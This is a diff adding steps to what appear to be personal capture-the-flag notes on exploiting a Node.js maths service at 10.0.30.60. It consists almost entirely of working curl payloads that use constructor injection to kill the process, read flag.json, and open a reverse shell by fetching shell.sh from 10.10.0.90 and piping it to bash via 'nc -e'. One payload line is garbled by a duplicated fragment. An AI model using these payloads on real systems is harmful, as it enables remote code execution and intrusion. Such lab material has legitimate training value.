@@ -25,3 +25,10 @@ curl --data-urlencode 'equation=cos.constructor("return process")()' "http://10.
 curl --data-urlencode 'equation=cos.constructor("return process.kill(process.pid,10)")()' "http://10.0.30.60/got_maths/maths"
 19.again typing curl -I http://10.0.30.60:9229
 20. I saw 400 Bad request very diferent to 502 Bad gateway
+21. later apply node inspect 10.0.30.60:9229
+22. read file since function equation
+22.1 curl -d 'equation=cos.constructor("return process.mainModule.constructor._load(\"fs\").readFileSync(\"./flag.json\")")()' "http://10.0.30.60/got_maths/maths"
+22. apply code for reverse_shell
+curl -d 'equation=cos.constructor("return+process.macurl -d 'equation=cos.constructor("return+process.mainModule.constructor._load(\"child_process\").exec(\"curl+10.10.0.90/shell.sh|/bin/bash\")")()' "http://10.0.30.60/got_maths/maths"
+23. the file shell.sh is the command nc -e /bin/bash <IP> <PORT> and |/bin/bash of equation is the execute
+
